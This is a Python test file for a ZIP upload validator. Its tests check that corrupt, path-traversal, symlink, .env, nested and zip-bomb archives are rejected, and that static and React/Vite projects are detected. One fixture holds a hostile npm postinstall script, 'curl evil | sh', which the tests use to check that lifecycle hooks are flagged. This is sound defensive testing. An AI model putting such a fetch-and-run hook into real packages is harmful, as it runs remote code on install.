"""ZIP validation tests (Test A inspection, Test B inspection, Test C invalid ZIPs)."""
import unittest
import zipfile

from ._helpers import FIXTURES, tmpdir

from backend.errors import ArchiveError
from backend.services import archive
from backend.services.archive import ArchiveLimits

LIM = ArchiveLimits(max_upload_bytes=5 * 1024 * 1024, max_uncompressed_bytes=50 * 1024 * 1024,
                    max_single_file_bytes=10 * 1024 * 1024, max_files=100, max_ratio=100)




def code_for(name: str, limits=LIM) -> str:
    try:
        archive.inspect_archive(FIXTURES[name], f"{name}.zip", limits)
    except ArchiveError as exc:
        return exc.code
    return "ACCEPTED"


class ValidArchives(unittest.TestCase):
    def test_static_detected(self):
        info = archive.inspect_archive(FIXTURES["static"], "static-site.zip", LIM)
        self.assertEqual(info["type"], "static")
        self.assertEqual(info["framework"], "Static HTML/CSS/JS")
        self.assertEqual(info["fileCount"], 3)

    def test_react_vite_detected(self):
        info = archive.inspect_archive(FIXTURES["react"], "react-vite-app.zip", LIM)
        self.assertEqual(info["type"], "node")
        self.assertEqual(info["framework"], "React (Vite)")
        self.assertTrue(info["hasBuildScript"])
        self.assertTrue(info["hasTestScript"])
        self.assertEqual(info["suggestedName"], "nexus-react-vite-fixture")

    def test_static_extracts_inside_destination(self):
        dest = tmpdir()
        root = archive.safe_extract(FIXTURES["static"], dest / "src", LIM)
        self.assertTrue((root / "index.html").is_file())
        self.assertTrue((root / "css" / "style.css").is_file())
        archive.scan_extracted_tree(root)

    def test_react_extract_unwraps_folder(self):
        dest = tmpdir()
        root = archive.safe_extract(FIXTURES["react"], dest / "src", LIM)
        self.assertTrue((root / "package.json").is_file())
        self.assertEqual(root.name, "react-vite-app")


class InvalidArchives(unittest.TestCase):
    def test_corrupt(self):
        self.assertEqual(code_for("corrupt"), "corrupt")

    def test_empty_file(self):
        self.assertEqual(code_for("empty_file"), "empty")

    def test_empty_zip(self):
        self.assertEqual(code_for("empty_zip"), "empty")

    def test_missing_application_files(self):
        self.assertEqual(code_for("no_project"), "no_project")

    def test_path_traversal(self):
        self.assertEqual(code_for("traversal"), "path_traversal")

    def test_absolute_path(self):
        self.assertEqual(code_for("absolute"), "path_traversal")

    def test_symlink(self):
        self.assertEqual(code_for("symlink"), "policy")

    def test_env_file(self):
        self.assertEqual(code_for("env_file"), "policy")

    def test_nested_zip(self):
        self.assertEqual(code_for("nested_zip"), "policy")

    def test_windows_reserved_name(self):
        self.assertEqual(code_for("reserved"), "bad_name")

    def test_duplicate_entries(self):
        self.assertEqual(code_for("duplicate"), "duplicate")

    def test_zip_bomb_ratio(self):
        self.assertEqual(code_for("bomb"), "zip_bomb")

    def test_oversized_upload(self):
        tiny = ArchiveLimits(max_upload_bytes=100)
        self.assertEqual(code_for("static", tiny), "too_large")

    def test_too_many_files(self):
        self.assertEqual(code_for("static", ArchiveLimits(max_files=2)), "too_many_files")

    def test_uncompressed_total_limit(self):
        lim = ArchiveLimits(max_uncompressed_bytes=10, max_ratio=100000)
        self.assertEqual(code_for("static", lim), "zip_bomb")

    def test_nothing_written_when_rejected(self):
        dest = tmpdir() / "src"
        with self.assertRaises(ArchiveError):
            archive.safe_extract(FIXTURES["traversal"], dest, LIM)
        self.assertFalse(dest.exists() and any(dest.rglob("*")))
        self.assertFalse((dest.parent.parent / "evil.txt").exists())

    def test_header_lying_about_size_is_caught_while_extracting(self):
        # Extraction counts real bytes: a tiny per-file limit stops a real stream.
        lim = ArchiveLimits(max_single_file_bytes=5, max_ratio=100000)
        with self.assertRaises(ArchiveError):
            archive.safe_extract(FIXTURES["static"], tmpdir() / "s", lim)


class Naming(unittest.TestCase):
    def test_slugify(self):
        self.assertEqual(archive.slugify("My Site!! v2"), "my-site-v2")
        self.assertEqual(archive.slugify("$$$"), "site")
        self.assertLessEqual(len(archive.slugify("a" * 200)), 50)

    def test_lifecycle_script_flagged(self):
        s = archive.summarize_package({"scripts": {"build": "x", "postinstall": "curl evil | sh"}})
        self.assertEqual(s["lifecycleScripts"], ["postinstall"])

    def test_default_npm_test_stub_is_not_a_test(self):
        s = archive.summarize_package({"scripts": {"test": 'echo "Error: no test specified" && exit 1'}})
        self.assertFalse(s["hasTestScript"])


if __name__ == "__main__":
    unittest.main()
